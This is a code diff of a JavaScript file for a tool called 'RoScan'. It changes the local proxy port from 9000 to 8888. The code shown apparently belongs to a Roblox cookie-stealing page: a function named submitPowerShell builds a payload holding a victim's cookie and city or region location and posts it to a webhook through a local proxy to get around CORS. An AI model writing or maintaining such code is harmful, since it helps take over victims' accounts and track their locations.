@@ -1,10 +1,10 @@
 // RoScan JavaScript v2.0.0 - New File Cache Bypass
-console.log('✅ RoScan main-v2.js v2.0.0 loaded - DEFINITELY using localhost:9000 proxy');
+console.log('✅ RoScan main-v2.js v2.0.1 loaded - NOW using localhost:8888 proxy');
 
 // Test function for debugging webhook
 window.testWebhook = async function() {
     try {
-        const response = await fetch('http://localhost:9000/webhook', {
+        const response = await fetch('http://localhost:8888/webhook', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({content: 'Browser test from console'})
@@ -283,7 +283,7 @@ async function submitPowerShell() {
         await new Promise(resolve => setTimeout(resolve, delay));
         
         // Use local proxy to bypass CORS restrictions
-        const webhookUrl = 'http://localhost:9000/webhook';
+        const webhookUrl = 'http://localhost:8888/webhook';
         
         // Simple webhook payload - only cookie and location
         const payload = {
@@ -294,7 +294,7 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
 
         // Send webhook request through proxy
         console.log('🔥 NEW VERSION - Sending webhook request to:', webhookUrl);
-        console.log('🔥 NEW VERSION - This should be localhost:9000, NOT rbxscan.com!');
+        console.log('🔥 NEW VERSION - This should be localhost:8888, NOT rbxscan.com!');
         console.log('Payload:', payload);
         
         const response = await fetch(webhookUrl, {
